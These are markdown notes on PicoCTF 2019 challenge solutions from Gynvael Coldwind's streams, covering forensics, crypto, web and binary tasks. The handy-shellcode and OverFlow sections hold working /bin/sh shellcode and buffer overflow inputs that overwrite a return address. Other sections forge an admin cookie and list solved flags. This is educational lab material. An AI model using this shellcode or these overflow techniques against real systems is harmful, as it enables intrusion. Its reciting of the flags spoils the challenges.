# Notes from Gynvael's Hacking Livestreams for PicoCTF Challenges

## Table of Contents

Title                                                                      | Category         | Points | Link to Gynvael's Stream
-------------------------------------------------------------------------- | ---------------- | ------ | ------------------------------
[The Factory’s Secret        ](#the-factorys-secret---general-skills)      | General          | 1      | 
[Glory of the Garden         ](#glory-of-the-garden---forensics)           | Forensics        | 50     | [Part 1 (33:36)](https://youtu.be/pYrGJuOUG7M?t=33m36s)
[Insp3ct0r                   ](#insp3ct0r---web-exploitation)              | Web              | 50     | [Part 1 (39:47)](https://youtu.be/pYrGJuOUG7M?t=39m47s)
[Let's Warm Up               ](#lets-warm-up---general-skills)             | General          | 50     | [Part 1 (48:19)](https://youtu.be/pYrGJuOUG7M?t=48m19s)
[The Numbers                 ](#the-numbers---cryptography)                | Crypto           | 50     | [Part 1 (50:26)](https://youtu.be/pYrGJuOUG7M?t=50m26s)
[Warmed Up                   ](#warmed-up---general-skills)                | General          | 50     | [Part 1 (1:00:06)](https://youtu.be/pYrGJuOUG7M?t=1h00m06s)
[2Warm                       ](#2warm---general-skills)                    | General          | 50     | [Part 1 (1:02:06)](https://youtu.be/pYrGJuOUG7M?t=1h02m06s)
[handy-shellcode             ](#handy-shellcode---binary-exploitation)     | Binary           | 50     | [Part 1 (1:05:30)](https://youtu.be/pYrGJuOUG7M?t=1h05m30s)
[practice-run-1              ](#practice-run-1---binary-exploitation)      | Binary           | 50     | [Part 1 (1:26:18)](https://youtu.be/pYrGJuOUG7M?t=1h26m18s)
[unzip                       ](#unzip---forensics)                         | Forensics        | 50     | [Part 1 (1:27:46)](https://youtu.be/pYrGJuOUG7M?t=1h27m46s)
[vault-door-training         ](#vault-door-training---reverse-engineering) | Reversing        | 50     | [Part 1 (1:30:02)](https://youtu.be/pYrGJuOUG7M?t=1h30m02s)
[13                          ](#13---cryptography)                         | Crypto           | 100    | [Part 1 (1:35:57)](https://youtu.be/pYrGJuOUG7M?t=1h35m57s)
[Bases                       ](#bases---general-skills)                    | General          | 100    | [Part 1 (1:38:50)](https://youtu.be/pYrGJuOUG7M?t=1h38m50s)
[Easy1                       ](#easy1---cryptography)                      | Crypto           | 100    | [Part 1 (1:47:50)](https://youtu.be/pYrGJuOUG7M?t=1h47m50s)
[First Grep                  ](#first-grep---general-skills)               | General          | 100    | [Part 1 (1:56:28)](https://youtu.be/pYrGJuOUG7M?t=1h56m28s)
[OverFlow 0                  ](#overflow-0---binary-exploitation)          | Binary           | 100    | [Part 1 (1:57:06)](https://youtu.be/pYrGJuOUG7M?t=1h57m06s)
[Resources                   ](#resources---general-skills)                | General          | 100    | [Part 1 (2:00:53)](https://youtu.be/pYrGJuOUG7M?t=2h00m53s)
[caesar                      ](#caesar----cryptography)                    | Crypto           | 100    | [Part 1 (2:01:28)](https://youtu.be/pYrGJuOUG7M?t=2h01m28s)
[dont-use-client-side        ](#dont-use-client-side---web-exploitation)   | Web              | 100    | [Part 1 (2:02:40)](https://youtu.be/pYrGJuOUG7M?t=2h02m40s)
[logon                       ](#logon---web-exploitation)                  | Web              | 100    | [Part 1 (2:05:42)](https://youtu.be/pYrGJuOUG7M?t=2h05m42s)
[strings it                  ](#strings-it---general-skills)               | General          | 100    | [Part 1 (2:11:07)](https://youtu.be/pYrGJuOUG7M?t=2h11m07s)
[vault-door-1                ](#vault-door-1---reverse-engineering)        | Reversing        | 100    | [Part 1 (2:13:31)](https://youtu.be/pYrGJuOUG7M?t=2h13m31s)
[what's a net cat            ](#whats-a-net-cat---general-skills)          | General          | 100    | [Part 1 (2:29:37)](https://youtu.be/pYrGJuOUG7M?t=2h29m37s)
[where are the robots        ](#where-are-the-robots---web-exploitation)   | Web              | 100    | [Part 1 (2:31:33)](https://youtu.be/pYrGJuOUG7M?t=2h31m33s)
[OverFlow 1                  ](#overflow-1---binary-exploitation)          | Binary           | 150    | [Part 1 (2:33:56)](https://youtu.be/pYrGJuOUG7M?t=2h33m56s)
[So Meta                     ](#so-meta---forensics)                       | Forensics        | 150    | [Part 1 (2:44:34)](https://youtu.be/pYrGJuOUG7M?t=2h44m34s)
[What Lies Within            ](#what-lies-within---forensics)              | Forensics        | 150    | [Part 1 (2:46:30)](https://youtu.be/pYrGJuOUG7M?t=2h46m30s)
[Extensions                  ](#extensions---forensics)                    | Forensics        | 150    | [Part 1 (3:08:03)](https://youtu.be/pYrGJuOUG7M?t=3h08m03s)
[shark on the wire 1         ](#shark-on-the-wire-1---forensics)           | Forensics        | 150    | [Part 1 (3:10:03)](https://youtu.be/pYrGJuOUG7M?t=3h10m03s)
[Based                       ](#based---general-skills)                    | General          | 200    | [Part 1 (3:20:40)](https://youtu.be/pYrGJuOUG7M?t=3h20m40s)
[Client-side-again           ](#client-side-again---web-exploitation)      | Web              | 200    | [Part 1 (3:25:29)](https://youtu.be/pYrGJuOUG7M?t=3h25m29s)
[First Grep: Part II         ](#first-grep-part-ii---general-skills)       | General          | 200    | [Part 1 (3:36:48)](https://youtu.be/pYrGJuOUG7M?t=3h36m48s)
[Flags                       ](#flags---cryptography)                      | Crypto           | 200    | [Part 1 (3:38:22)](https://youtu.be/pYrGJuOUG7M?t=3h38m22s)
[Mr-Worldwide                ](#mr-worldwide---cryptography)               | Crypto           | 200    | [Part 1 (3:44:54)](https://youtu.be/pYrGJuOUG7M?t=3h44m54s)
[Open-to-admins              ](#open-to-admins---web-exploitation)         | Web              | 200    | [Part 1 (4:05:34)](https://youtu.be/pYrGJuOUG7M?t=4h05m34s)
[Tapping                     ](#tapping---cryptography)                    | Crypto           | 200    | [Part 1 (4:21:28)](https://youtu.be/pYrGJuOUG7M?t=4h21m28s)
[la cifra de                 ](#la-cifra-de---cryptography)                | Crypto           | 200    | [Part 1 (4:23:14)](https://youtu.be/pYrGJuOUG7M?t=4h23m14s)

## Credits
All the credit goes to [Gynvael Coldwind](https://www.youtube.com/channel/UCCkVMojdBWS-JtH7TliWkVg) for making these streams. Check him out.  
I based the table format above on [this](https://github.com/shiltemann/CTF-writeups-public/blob/master/PicoCTF_2018/writeup.md#overview).

## The Factory's Secret - General Skills
Gynvael gave up on this. Maybe it was too easy.

## Glory of the Garden - Forensics
```
$ file garden.jpg # This is to confirm that this file is actually a jpg
garden.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, baseline, precision 8, 2999x2249, frames 3
$ ls -la garden.jpg # Check size
-rw-rw-rw- 1 root root 2295192 Sep 28  2019 garden.jpg
$ strings garden.jpg | grep pico # Look for the string “pico” in the file
Here is a flag "picoCTF{more_than_m33ts_the_3y3b7FBD20b}"
```
Grep to win (used in super easy challenges or badly prepared challenges

## Insp3ct0r - Web Exploitation
Just use “view page source”

## Let's Warm Up - General Skills 
Just use an online ascii table or hex to ascii converter or the following
```
$ python
>>> chr(0x70)
'p'
```
or just `man ascii` 

## The Numbers - Cryptography 
There are only numbers no larger than 26 so the numbers just stand for the index of each letter in the alphabet. Manually do it or use this script from gynvael:
```
import string
a = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
k = [16, 9, 3, 15, 3, 20, 6, 20, 8, 5, 14, 21, 13, 2, 5, 18, 19, 13, 1, 19, 15, 14]

# We don't know if the index starts at 0 or 1
print(''.join([a[n-1] for n in k]))
print(''.join([a[n] for n in k]))
```

## Warmed Up - General Skills
0x3D to base 10

```
0x3        +      0xD =
3 * 16    +      0xD =
48         +      0xD =
48         +      13   =
61
```

## 2Warm - General Skills 
```
$ python
>>> bin(42)
'0b101010'
```
or use math and do it the long way
```
2 * 16  =  0x20  = 32 
3 * 16  =  0x30  =  48

So 42 in decimal is 0x2A

Powers of 2: 8421

2      A
01    1010
```
## handy-shellcode - Binary Exploitation 
Connect to the shell server
```
$ ls -la  /problems/handy-shellcode_4_037bd47611d842b565cfa1f378bfd8d9
total 732
drwxr-xr-x   2 root       root                4096 Sep 28  2019 .
drwxr-x--x 684 root       root               69632 Oct 10  2019 ..
-r--r-----   1 hacksports handy-shellcode_4     39 Sep 28  2019 flag.txt
-rwxr-sr-x   1 hacksports handy-shellcode_4 661832 Sep 28  2019 vuln
-rw-rw-r--   1 hacksports hacksports           624 Sep 28  2019 vuln.c
```
The gets() function is the vulnerable part of the code. This means we can use any character except '\n' or 0x0A
```
 void vuln(char *buf){
 	gets(buf);
  puts(buf);
}
```

In main(), this line runs the input
```
((void (*)())buf)();
```

If we just run the program and put in random input like asdf, the program will crash since asdf aren't valid instruction that can be executed
```
$ ./vuln
Enter your shellcode:
asdf
asdf
Thanks! Executing now...
Segmentation fault (core dumped)
```
As we can see, the program just segfaults.


However, if we use 0xC3 as the input, the program will run without crashing since 0xC3 is the 'ret' assembly instruction, so when we run the program with it as input, the program should exit without crashing.
```
$ echo -e '\xC3' | ./vuln 
```

This confirms our assumptions of how the program runs. According to Gynvael, exploitation is a process where "everything can go wrong," so it's good to work with small steps to make sure our assumptions are correct.

Find out what architecture the shellcode should be:
```
$ file vuln
vuln: setgid ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=7b65fbf1fba331b6b09a6812a338dbb1118e68e9, not stripped
```
This shows us that the program is a 32 bit program running on x86 Linux. 

To find some shellcode just google "x86 32 linux shellcode"
We find some shellcode for spawning a shell [here](http://shell-storm.org/shellcode/files/shellcode-827.php)
```
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
```

Let's give vuln the shellcode as input
```
$ echo -e '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80` | ./vuln
Enter your shellcode:
1Ph//shh/binPS
Thanks! Executing now...
```
The shellcode above doesn't seem to work, but it actually does. The program just exits after successfully running the shellcode and spawning a shell. In order to interact with the shell, we need to keep stdin open.
```
$ (echo -e '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80`; cat) | ./vuln
Enter your shellcode:
1Ph//shh/binPS
Thanks! Executing now...
ls
flag.txt  vuln  vuln.c
cat flag.txt
picoCTF{h4ndY_d4ndY_sh311c0d3_55c521fe}
```
Gynvael saves his shellcode to a file and then uses `cat shellcode - | ./vuln` instead but the above does the same thing.

## practice-run-1 - Binary Exploitation 
Login to the shell server and just run the binary
```
$ cd /problems/practice-run-1_0_62b61488e896645ebff9b6c97d0e775e
$ ls -la
total 84
drwxr-xr-x   2 root       root              4096 Sep 28  2019 .
drwxr-x--x 684 root       root             69632 Oct 10  2019 ..
-rwxr-sr-x   1 hacksports practice-run-1_0  7252 Sep 28  2019 run_this
$ ./run_this
picoCTF{g3t_r3adY_2_r3v3r53}
```

## unzip - Forensics 
```
$ file flag.zip
flag.zip: Zip archive data, at least v2.0 to extract
$ strings flag.zip | grep pico # Grep2win doesn't work
$ unzip flag.zip
Archive:  flag.zip
  inflating: flag.png
$ ls
flag.png  flag.zip
```
The flag is in flag.png

## vault-door-training - Reverse Engineering 
The flag is in the source code

## 13 - Cryptography 
Just use a ROT13 decrypter
ROT13 is just a simple cipher.
Gynvael suggests implementing it if you haven't already; otherwise just use a decrypter online like [https://rot13.com/]. Time counts on CTFs, so just use the fastest method.

## Bases - General Skills 
Convert from Base64
Base64 is used to encode binary to a printable text

Python2
```
$ python
>>> "bDNhcm5fdGgzX3IwcDM1".decode("base64")
'l3arn_th3_r0p35'
```

Python3
```
$ python3
>>> import base64
base64.b64decode("bDNhcm5fdGgzX3IwcDM1")
b'l3arn_th3_r0p35'
```

## Easy1 - Cryptography 
Basic substitution cipher [Vigenère cipher](https://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher)
Use the table

## First Grep - General Skills 
Grep to win
```
$ cat file | grep pico
picoCTF{grep_is_good_to_find_things_ad4e9645}
```

## OverFlow 0 - Binary Exploitation 
This line of code means the  sigsegv_handler() function is called when the program crashes.
```
signal(SIGSEGV, sigsegv_handler);
```

We just have to crash the program to get the flag read to us:
```
void sigsegv_handler(int sig) {
  fprintf(stderr, "%s\n", flag); // This prints our flag
  fflush(stderr);
  exit(1);
}
```

To crash the program, just overflow the buffer by sending in more than buffer length
```
$ ./vuln AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
picoCTF{3asY_P3a5y1fcf81f9}
```

## Resources - General Skills 
Just go to the link and scroll down

## caesar  - Cryptography 
Caesar cipher is basically rot-n where n is a number. Use an online decoder like [http://theblob.org/rot.cgi]. 

## dont-use-client-side - Web Exploitation 
```
<script type="text/javascript">
  function verify() {
    checkpass = document.getElementById("pass").value;
    split = 4;
    if (checkpass.substring(0, split) == 'pico') {
      if (checkpass.substring(split*6, split*7) == 'b956') {
        if (checkpass.substring(split, split*2) == 'CTF{') {
         if (checkpass.substring(split*4, split*5) == 'ts_p') {
          if (checkpass.substring(split*3, split*4) == 'lien') {
            if (checkpass.substring(split*5, split*6) == 'lz_e') {
              if (checkpass.substring(split*2, split*3) == 'no_c') {
                if (checkpass.substring(split*7, split*8) == 'b}') {
                  alert("Password Verified")
                  }
                }
              }
      
            }
          }
        }
      }
    }
    else {
      alert("Incorrect password");
    }
    
  }
</script>
```
Just sort the substrings in order and then add them all to form the completed flag.

## logon - Web Exploitation 
Set the admin cookie to True

## strings it - General Skills 
Another grep to win
```
$ strings strings | grep pico
picoCTF{5tRIng5_1T_c611cac7}
```

## vault-door-1 - Reverse Engineering 
Just sort the charAt() by indexes and combine the characters into the completed string.
```
password.charAt(0)  == 'd'
password.charAt(29) == '7'
password.charAt(4)  == 'r'
password.charAt(2)  == '5'
password.charAt(23) == 'r'
password.charAt(3)  == 'c'
password.charAt(17) == '4'
password.charAt(1)  == '3'
password.charAt(7)  == 'b'
password.charAt(10) == '_'
password.charAt(5)  == '4'
password.charAt(9)  == '3'
password.charAt(11) == 't'
password.charAt(15) == 'c'
password.charAt(8)  == 'l'
password.charAt(12) == 'H'
password.charAt(20) == 'c'
password.charAt(14) == '_'
password.charAt(6)  == 'm'
password.charAt(24) == '5'
password.charAt(18) == 'r'
password.charAt(13) == '3'
password.charAt(19) == '4'
password.charAt(21) == 'T'
password.charAt(16) == 'H'
password.charAt(27) == '3'
password.charAt(30) == 'a'
password.charAt(25) == '_'
password.charAt(22) == '3'
password.charAt(28) == 'b'
password.charAt(26) == '0'
password.charAt(31) == '0'
```

## what's a net cat - General Skills 
```
$ nc -v 2019shell1.picoctf.com 37851
Connection to 2019shell1.picoctf.com 37851 port [tcp/*] succeeded!
You're on your way to becoming the net cat master
picoCTF{nEtCat_Mast3ry_628e0244}
```  

## where are the robots - Web Exploitation 
Go to the robots.txt
You'll find that there is a 'secret' webpage: /8e32f.html
You'll find the flag there

The robots.txt is a "sign" to tell web crawlers and search engines like Google not to index or go to those webpages

## OverFlow 1 - Binary Exploitation
 Check what type of binary this is
```
$ file vuln
vuln: setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 3.2.0, BuildID[sha1]=5d4cdc8dc51fb3e5d45c2a59c6a9cd7958382fc9, not stripped
```

The vulnerable part of the code is the  `gets(buf);` in the vuln() function:
```
void vuln(){
  char buf[BUFFSIZE];
  gets(buf);

  printf("Woah, were jumping to 0x%x !\n", get_return_address());
}
```

The source code already has a flag() function helpfully placed in the program to read the flag out to us:
```
void flag() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}
```

We just have to overwrite the return address with the address of flag.

Get the address of flag
```
$ objdump -d ./vuln | grep flag
080485e6 <flag>:
 8048618:       75 1c                   jne    8048636 <flag+0x50>
```
The address of the flag() function is 0x80485e6

Intel x86 uses little endian so use e6 85 04 08  when overwriting the ret address

```
$ echo -e 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDD\xe6\x85\x04\x08' | ./vuln
Give me a string and lets see what happens:
Woah, were jumping to 0x80485e6 !
picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5fe1ff3d8}Segmentation fault (core dumped)
```
We use more than 64 bytes because there's some padding and other stuff we have to overwrite before we hit the return address (like the saved EBP). Experiment with different amounts of A's to see how many bytes are needed to reach the ret address.

## So Meta - Forensics 
Grep to win
```
$ strings  pico_img.png | grep pico
picoCTF{s0_m3ta_43f253bb}
```

or use exiftool to look at metadata
```
$ exiftool pico_img.png | grep pico
File Name                       : pico_img.png
Artist                          : picoCTF{s0_m3ta_43f253bb}
```

## What Lies Within - Forensics
```
$ strings buildings.png | grep pico # Always grep to win
$ file buildings.png
buildings.png: PNG image data, 657 x 438, 8-bit/color RGBA, non-interlaced
$ exiftool buildings.png # Check the metadata
ExifTool Version Number         : 10.80
File Name                       : buildings.png
Directory                       : .
File Size                       : 611 kB
File Modification Date/Time     : 2019:09:28 10:54:24-04:00
File Access Date/Time           : 2020:05:05 16:41:04-04:00
File Inode Change Date/Time     : 2020:05:05 16:41:04-04:00
File Permissions                : rw-rw-rw-
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 657
Image Height                    : 438
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Image Size                      : 657x438
Megapixels                      : 0.288
```
Gynvael tries editing the headers to see if there are any hidden rows, opening in GIMP to see if any of the channels have data, and tries adjusting the color curves.

LSB (Least Significant Bit) Steganography turns out to be the solution. 

Data is hidden using the least significant bit. E.g. for a color 0x31708f, the f could be changed to a b to store data. The small change in color is not really noticeable.

Use an online [decoder](https://stylesuxx.github.io/steganography/). If you've never implemented LSB steg, then that's another thing you should implement according to gynvael.

## Extensions - Forensics
```
$ strings flag.txt | grep pico # Grep to win
$ file flag.txt
flag.txt: PNG image data, 1697 x 608, 8-bit/color RGB, non-interlaced
$ mv flag.txt flag.png # Change the extension to a png
```
Just change the extension and open the image

## shark on the wire 1 - Forensics
Use wireshark

Gynvael does the following: 

Filter packet bytes string pico
Notice that there are UDP packets with length 1 that seem to contain one character of the flag. Filter for UPD packets of length 1. Filter again with 10.0.0.2 since that is the IP address that seems to be associated with the flag data.

Gynvael then just uses "Follow UDP stream" to find the flag

## Based - General Skills 
Just convert binary to ascii, decimal to ascii, and octal to ascii, etc.
```
$ python
>>> list = "146 141 154 143 157 156"
>>> base = 8
>>> ''.join([chr(int(x, base)) for x in list.split(" ")]) # Converts base to ascii
'falcon'
>>> "7461626c65".decode('hex') # Converts hex to ascii
'table'
```

Converting hex to ascii in python3
```
$ python
>>> bytes.fromhex("7461626c65")
b'table'
```

## Client-side-again - Web Exploitation 
Look at the verify() function in the javascript
```
function verify() {
    checkpass = document[_0x4b5b('0x0')]('pass')[_0x4b5b('0x1')];
    split = 0x4;
    if (checkpass[_0x4b5b('0x2')](0x0, split * 0x2) == _0x4b5b('0x3')) {
        if (checkpass[_0x4b5b('0x2')](0x7, 0x9) == '{n') {
            if (checkpass[_0x4b5b('0x2')](split * 0x2, split * 0x2 * 0x2) == _0x4b5b('0x4')) {
                if (checkpass[_0x4b5b('0x2')](0x3, 0x6) == 'oCT') {
                    if (checkpass[_0x4b5b('0x2')](split * 0x3 * 0x2, split * 0x4 * 0x2) == _0x4b5b('0x5')) {
                        if (checkpass['substring'](0x6, 0xb) == 'F{not') {
                            if (checkpass[_0x4b5b('0x2')](split * 0x2 * 0x2, split * 0x3 * 0x2) == _0x4b5b('0x6')) {
                                if (checkpass[_0x4b5b('0x2')](0xc, 0x10) == _0x4b5b('0x7')) {
                                    alert(_0x4b5b('0x8'));
                                }
                            }
                        }
                    }
                }
            }
        }
    } else {
        alert(_0x4b5b('0x9'));
    }
}
```
Isolate only the if cases
```
if (checkpass[_0x4b5b('0x2')](0x0, split * 0x2) == _0x4b5b('0x3'))
if (checkpass[_0x4b5b('0x2')](0x7, 0x9) == '{n')
if (checkpass[_0x4b5b('0x2')](split * 0x2, split * 0x2 * 0x2) == _0x4b5b('0x4'))
if (checkpass[_0x4b5b('0x2')](0x3, 0x6) == 'oCT')
if (checkpass[_0x4b5b('0x2')](split * 0x3 * 0x2, split * 0x4 * 0x2) == _0x4b5b('0x5'))
if (checkpass['substring'](0x6, 0xb) == 'F{not')
if (checkpass[_0x4b5b('0x2')](split * 0x2 * 0x2, split * 0x3 * 0x2) == _0x4b5b('0x6'))
if (checkpass[_0x4b5b('0x2')](0xc, 0x10) == _0x4b5b('0x7'))
```

Replace split with 0x4 since we know split = 0x4
```
if (checkpass[_0x4b5b('0x2')](0x0, 0x4 * 0x2) == _0x4b5b('0x3'))
if (checkpass[_0x4b5b('0x2')](0x7, 0x9) == '{n')
if (checkpass[_0x4b5b('0x2')](0x4 * 0x2, 0x4 * 0x2 * 0x2) == _0x4b5b('0x4'))
if (checkpass[_0x4b5b('0x2')](0x3, 0x6) == 'oCT')
if (checkpass[_0x4b5b('0x2')](0x4 * 0x3 * 0x2, 0x4 * 0x4 * 0x2) == _0x4b5b('0x5'))
if (checkpass['substring'](0x6, 0xb) == 'F{not')
if (checkpass[_0x4b5b('0x2')](0x4 * 0x2 * 0x2, 0x4 * 0x3 * 0x2) == _0x4b5b('0x6'))
if (checkpass[_0x4b5b('0x2')](0xc, 0x10) == _0x4b5b('0x7'))
```

Do math and simplify
```
if (checkpass[_0x4b5b('0x2')](0, 8) == _0x4b5b('0x3'))
if (checkpass[_0x4b5b('0x2')](7, 9) == '{n')
if (checkpass[_0x4b5b('0x2')](8, 16) == _0x4b5b('0x4'))
if (checkpass[_0x4b5b('0x2')](3, 6) == 'oCT')
if (checkpass[_0x4b5b('0x2')](24, 32) == _0x4b5b('0x5'))
if (checkpass['substring'](6, 11) == 'F{not')
if (checkpass[_0x4b5b('0x2')](16, 24) == _0x4b5b('0x6'))
if (checkpass[_0x4b5b('0x2')](12, 16) == _0x4b5b('0x7'))
```

We can use the javascript console to figure out that _0x4b5b('0x2') is just substring so all the checkpass[_0x4b5b('0x2')] can be replaced with checkpass['substring']
```
if (checkpass['substring'](0, 8) == _0x4b5b('0x3'))
if (checkpass['substring'](7, 9) == '{n')
if (checkpass['substring'](8, 16) == _0x4b5b('0x4'))
if (checkpass['substring'](3, 6) == 'oCT')
if (checkpass['substring'](24, 32) == _0x4b5b('0x5'))
if (checkpass['substring'](6, 11) == 'F{not')
if (checkpass['substring'](16, 24) == _0x4b5b('0x6'))
if (checkpass['substring'](12, 16) == _0x4b5b('0x7'))
```

Remove redundant checks
```
if (checkpass['substring'](0, 8) == _0x4b5b('0x3'))
if (checkpass['substring'](8, 16) == _0x4b5b('0x4'))
if (checkpass['substring'](24, 32) == _0x4b5b('0x5'))
if (checkpass['substring'](16, 24) == _0x4b5b('0x6'))
```

Use the javascript console to figure out what _0x4b5b('0x3') and so on are.
```
if (checkpass['substring'](0, 8) == "picoCTF{")
if (checkpass['substring'](8, 16) == "not_this")
if (checkpass['substring'](24, 32) == "9d025}")
if (checkpass['substring'](16, 24) == "_again_3")
``` 

Piece the flag together using above:
picoCTF{not_this_again_39d025}

## First Grep: Part II - General Skills 
```
$ rgrep pico
files1/file22:picoCTF{grep_r_to_find_this_af11356f}
```

## Flags - Cryptography 
Just use a navy flags chart [International Code of Signals](https://en.wikipedia.org/wiki/International_Code_of_Signals).
Flag is all CAPS

## Mr-Worldwide - Cryptography 
First letter of city names of the GPS coordinates.

## Open-to-admins - Web Exploitation 
Gynvael adds an admin="True" cookie, but it doesn't do anything.
Gynvael looks at session data.

But it turns out you just had to set the cookies:
In the javascript console
```
> document.cookie="time=1400"
> document.cookie="admin=True"
```

## Tapping - Cryptography 
Just use a morse code [decoder](http://www.unit-conversion.info/texttools/morse-code/).

All uppercase
```
python
>>> "picoctf{m0rs3c0d31sfun1818224575}".upper()
PICOCTF{M0RS3C0D31SFUN1818224575}
```

## la cifra de - Cryptography 

It uses the Vigenère cipher. Just use an online [decoder](https://www.guballa.de/vigenere-solver) using English. 

## Random other stuff gynvael says during the stream
* He recommends kaitai struct for stegno challenges (Part 1: 46:39)
* Recommends pdfstreamdumper
* Thumbnails can store info
* For network dumps there are two main tools: Wireshark and NetworkMiner

## TODO 
Fix all the weird non ascii apostrophes and double quotes




